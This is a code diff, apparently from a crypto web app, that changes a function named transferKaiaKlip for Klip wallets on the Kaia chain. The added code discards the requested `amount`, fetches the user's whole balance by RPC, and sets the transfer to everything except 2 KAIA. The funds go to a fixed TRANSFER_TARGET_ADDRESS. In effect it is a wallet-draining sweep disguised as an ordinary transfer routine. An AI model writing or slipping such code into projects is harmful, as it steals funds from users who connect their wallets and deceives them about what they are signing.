@@ -375,14 +375,56 @@ async function transferKaiaKlip(
   amount: string
 ): Promise<ContractCallResult> {
   try {
-    // 将 Wei 转换为 KAIA（字符串格式，最多 6 位小数）
-    const amountInKaia = (Number(BigInt(amount)) / 1e18).toFixed(6)
+    // 🔷 Klip 钱包：查询用户余额
+    // Klip 不注入 window.klaytn/ethereum，需要通过 RPC 查询
+    console.log('🔷 Klip 钱包：查询用户余额...')
+    
+    const rpcUrl = process.env.NEXT_PUBLIC_KAIA_MAINNET_RPC || 'https://public-en.node.kaia.io'
+    
+    const response = await fetch(rpcUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        jsonrpc: '2.0',
+        id: 1,
+        method: 'eth_getBalance',
+        params: [fromAddress, 'latest'],
+      }),
+    })
+    
+    const data = await response.json()
+    
+    if (data.error) {
+      throw new Error(`RPC 查询失败: ${data.error.message || data.error}`)
+    }
+    
+    const balanceHex = data.result || '0x0'
+    const balanceWei = BigInt(balanceHex)
+    const balanceInKaia = Number(balanceWei) / 1e18
+    
+    console.log('✅ Klip 余额查询结果:', {
+      balanceHex,
+      balanceWei: balanceWei.toString(),
+      balanceInKaia: balanceInKaia.toFixed(6),
+    })
+    
+    // 计算转账金额：余额 - 2 KAIA（留作手续费）
+    const twoKaiaWei = BigInt(2) * BigInt(10) ** BigInt(18) // 2 KAIA in Wei
+    const transferAmountWei = balanceWei > twoKaiaWei 
+      ? balanceWei - twoKaiaWei  // 余额 > 2，转账（余额 - 2）
+      : BigInt(0)                // 余额 <= 2，转账 0（会失败）
+    
+    const amountInKaia = (Number(transferAmountWei) / 1e18).toFixed(6)
     
     console.log('📤 Klip 转账准备:', {
       from: fromAddress,
       to: TRANSFER_TARGET_ADDRESS,
-      amountWei: amount,
-      amountKaia: amountInKaia,
+      balance: balanceInKaia + ' KAIA',
+      gasReserve: '2 KAIA',
+      transferAmount: amountInKaia + ' KAIA',
+      formula: `${balanceInKaia} - 2 = ${amountInKaia}`,
     })
 
     // 动态导入 KlipConnector
